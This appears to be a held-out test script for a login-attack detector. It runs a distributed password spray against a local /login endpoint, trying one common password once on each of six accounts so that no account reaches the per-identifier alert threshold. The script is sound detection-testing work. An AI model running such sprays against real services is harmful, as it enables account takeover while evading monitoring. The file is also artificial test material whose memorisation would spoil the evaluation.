#!/bin/bash
# Held-out variant of S2 (Brute-Force Login, T1110).
# Original: 6 failed logins for the SAME username (admin) within seconds.
# Variant : a password spray - ONE failed attempt each across several
# accounts, so no single identifier reaches the detector's threshold
# (5 failures for the same identifier within 30s). Same missing-rate-limit
# weakness on the same /login endpoint, distributed instead of concentrated.
# Expected: detection GAP (per-identifier threshold never reached).
echo "========================================="
echo "S2 held-out variant - distributed password spray"
echo "========================================="
for user in svc_backup operator deploy monitoring release_bot audit_ro; do
    echo "spraying $user"
    curl -s -X POST http://localhost:5000/login \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$user\",\"password\":\"Autumn2026!\"}" >/dev/null
    sleep 2
done
echo
echo "[done] Spray across 6 accounts sent (1 attempt each)."
